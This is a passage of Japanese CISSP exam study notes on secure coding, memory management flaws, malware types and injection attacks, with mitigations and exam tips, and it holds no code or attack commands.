- ソース コードにパスワード/API キーを含めることは、**重大なセキュリティ上の欠陥** となります。

🛑 リスク:
- GitHub/パブリックリポジトリを通じて資格情報を公開する
- 攻撃者に永続的なアクセスを提供する

🔒 **CISSP ガイダンス**:
- 秘密を**安全な金庫**または暗号化された構成に保存する
- コミット前にシークレットスキャンを強制する

#### メモリ管理

##### リソース枯渇
- メモリ/CPU/ディスク使用量が多すぎるとサービス拒否（DoS）が発生します
- 例: **メモリリーク** – プログラムはメモリを割り当てますが、解放しません

✅ 使用方法:
- ガベージコレクション
- リソースの割り当て/制限
- 負荷をかけた状態での定期的なテスト

##### ポインタの参照解除
- C/C++のような低レベル言語でよく使われる
- **null ポインタ** 参照によりアプリがクラッシュしたり、システムデータが漏洩したりする可能性がある

🧠 **CISSP インサイト**:
- 使用前にポインタを検証する
- 可能な限りメモリセーフな言語（例：Rust、Java）を使用する

#### セキュアコーディングの脅威と防御の概要

| 問題 | リスク | 軽減戦略 |
|------------------------|-----------------------------------|-------------------------------------------------|
| ソース内のコメント | コード内部を公開 | 製品ビルドから削除 |
| エラー処理が不十分 | 情報漏洩 / クラッシュ | try…catch を使用して安全にログを記録する |
| ハードコードされた資格情報 | 永続的な侵害リスク | 安全な秘密管理 |
| メモリ リーク | リソース枯渇による DoS | メモリ クリーンアップ、リソース クォータ |
| ヌル ポインタ参照 | アプリケーションのクラッシュまたはハイジャック | ポインタを検証し、最新の言語を使用する |

🔐 **CISSP試験の注意**: セキュアコーディングはプロアクティブな管理です。アプリケーションがデプロイされる**前**に脆弱性を軽減します。

＃＃＃ まとめ

悪意のある攻撃者は、アプリケーション、システム、そしてユーザーの脆弱性を悪用するためのツールと手法を絶えず進化させています。第21章では、現代の脅威に対抗するには多層防御アプローチが不可欠であることを強調しています。以下に、重要な概念とベストプラクティスをまとめました。

#### 🦠 マルウェアの脅威
- **種類**: ウイルス、ワーム、トロイの木馬、ロジックボム、スパイウェア、アドウェア、ランサムウェア、ルートキット、ファイルレス マルウェア。
- **ベクトル**: 電子メールの添付ファイル、Web サイト、リムーバブル メディア、脆弱なアプリケーション。
- **注目すべき脅威**: Stuxnet (産業破壊行為)、Code Red (大量スキャンワーム)、最新のランサムウェア (暗号化による恐喝)。

#### 🔒 マルウェア対策
- 最新の**マルウェア対策**を以下とともに使用してください:
  - 既知の脅威に対するシグネチャベースの検出
  - 未知の脅威に対するヒューリスティックスとサンドボックス
- 高度な防御のために**ファイル整合性監視**、**EDR**、**UEBA**、**MDR**を採用
- Windows、macOS、Linux、モバイルOSを含むすべてのプラットフォームを保護

#### ⚔️ アプリケーション攻撃
- 一般的なベクトル:
  - **バッファオーバーフロー** (メモリ破損)
  - **TOCTTOU** (競合状態)
  - **バックドア** (文書化されていないアクセス)
  - **権限昇格** (ユーザー → 管理者)
  - **ルートキット** (ステルス永続性)

#### 💉 インジェクション脆弱性
- **SQL インジェクション** とその形式: クラシック、ブラインド (コンテンツベース、タイミングベース)
- **コードインジェクション** LDAP、XML、HTML、DLLライブラリを標的とする
- **コマンドインジェクション** により OS レベルのコマンド実行につながる

#### 🛡️ セキュアコーディングプラクティス
- 制御を階層化して **多層防御** を実行します。
  - 入力検証（ホワイトリスト > ブラックリスト）
  - 安全なメモリ管理
  - 内部を公開せずにエラーを処理する
  - ハードコードされた資格情報を避ける
- 以下を使用してコードを保護します。
  - 安全なソース管理（例：アクセス制御付きのGit）
  - コード署名と整合性検証
  - 静的および動的解析

#### 🚨 CISSP のポイント
- マルウェアとアプリケーション セキュリティは密接に絡み合っています。
- 安全なソフトウェア設計により、展開前に脆弱性が軽減されます。
- **安全なコーディング標準** (例: OWASP、CERT、SEI) に常に従ってください。
- 最善の防御は**予防**であり、検出と迅速な対応によってサポートされます。

🧠 **試験に向けた最後のヒント**: **脅威の種類 → 攻撃ベクトル → 緩和戦略** をマッピングできるようにしてください。エクスプロイトの仕組みとそれに対応する多層防御制御に関する理解度を問われる問題が出題される可能性があります。
